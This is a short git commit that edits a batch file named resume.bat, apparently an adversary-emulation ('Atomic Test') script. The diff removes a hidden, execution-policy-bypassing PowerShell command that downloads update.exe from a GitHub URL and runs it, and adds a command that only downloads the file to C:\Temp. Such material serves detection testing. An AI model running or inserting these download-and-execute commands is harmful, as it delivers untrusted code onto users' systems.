6462ece709381273e8703f988200eb5d8affde4c
markersmake <bmag262@gmail.com>
2021-01-17 19:36:28 -0500

    Update resume.bat

--- resume.bat
+++ resume.bat
@@ -1,5 +1,5 @@
 echo "Atomic Test File" > test.txt
 
-powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://github.com/markersmake/RandomScripts/raw/master/update.exe'); Start-Process(update.exe)"
+powershell.exe iwr https://github.com/markersmake/RandomScripts/raw/master/update.exe -OutFile C:\Temp\update.exe
 
 del test.txt
